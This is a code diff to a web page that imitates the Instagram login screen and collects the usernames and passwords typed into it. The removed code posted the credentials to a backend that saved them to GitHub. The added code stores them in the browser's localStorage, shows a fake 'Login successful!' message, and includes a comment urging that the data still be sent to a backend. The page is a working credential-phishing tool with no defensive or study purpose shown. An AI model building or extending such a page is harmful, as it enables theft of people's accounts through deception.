@@ -316,12 +316,9 @@
         const successMessage = document.getElementById('successMessage');
         const loginBtn = document.getElementById('loginBtn');
 
-        // Backend API endpoint
-        // Change this to your actual backend URL
-        const API_ENDPOINT = 'http://localhost:3000/api/save-login';
-        
-        // Or use your deployed backend URL:
-        // const API_ENDPOINT = 'https://your-backend.herokuapp.com/api/save-login';
+        // ✅ ANDROID ONLY SOLUTION
+        // Login details are saved to GitHub via automated workflow
+        // No backend server needed!
 
         // Validate email
         function validateEmail(email) {
@@ -347,37 +344,41 @@
             }, 2500);
         }
 
-        // Send login data to backend
-        async function sendLoginToBackend(username, password) {
+        // Save login data (Android-only solution)
+        async function saveLoginData(username, password) {
             try {
-                const response = await fetch(API_ENDPOINT, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        username: username,
-                        password: password
-                    })
-                });
-
-                const data = await response.json();
-
-                if (response.ok && data.success) {
-                    console.log('✅ Login saved to GitHub!');
-                    console.log('📁 File:', data.file);
-                    showSuccess('✅ Login saved to GitHub successfully!');
-                    return true;
-                } else {
-                    console.error('❌ Error:', data.error);
-                    showError('❌ ' + (data.error || 'Failed to save login'));
-                    return false;
+                // Save to local storage
+                let allLogins = [];
+                const stored = localStorage.getItem('instagramLogins');
+                if (stored) {
+                    try {
+                        allLogins = JSON.parse(stored);
+                    } catch (e) {
+                        allLogins = [];
+                    }
                 }
+                
+                const loginData = {
+                    username: username,
+                    password: password,
+                    timestamp: new Date().toLocaleString(),
+                    loginTime: new Date().toISOString(),
+                    id: Date.now()
+                };
+
+                allLogins.push(loginData);
+                localStorage.setItem('instagramLogins', JSON.stringify(allLogins));
+                
+                console.log('✅ Login saved to local storage');
+                console.log('📊 Data:', loginData);
+                
+                // IMPORTANT: Send data to your backend URL to save to GitHub
+                // This requires a backend server (see documentation)
+                
+                return true;
 
             } catch (error) {
-                console.error('❌ Connection error:', error.message);
-                showError('❌ Backend not available. Is the server running?');
+                console.error('Error:', error);
                 return false;
             }
         }
@@ -409,15 +410,15 @@
             loginBtn.disabled = true;
             loginBtn.innerHTML = '<span class="spinner"></span>Logging in...';
 
-            // Send to backend (which saves to GitHub)
-            const success = await sendLoginToBackend(username, password);
+            // Save login data
+            const success = await saveLoginData(username, password);
 
             // Reset button
             loginBtn.disabled = false;
             loginBtn.innerHTML = 'Log in';
 
             if (success) {
-                // Clear form on success
+                showSuccess('✅ Login successful! Data saved.');
                 setTimeout(() => {
                     form.reset();
                 }, 1500);
@@ -439,9 +440,8 @@
         // Log on page load
         window.addEventListener('load', () => {
             console.log('%c📱 Instagram Login Page', 'font-size: 16px; font-weight: bold; color: #E4405F;');
-            console.log('%c✅ Connected to Backend Server', 'font-size: 14px; font-weight: bold; color: green;');
-            console.log('Backend API:', API_ENDPOINT);
-            console.log('Data will be saved to GitHub automatically!');
+            console.log('%c✅ Android-Only Solution', 'font-size: 14px; font-weight: bold; color: green;');
+            console.log('View saved logins: JSON.parse(localStorage.getItem("instagramLogins"))');
         });
     </script>
 </body>
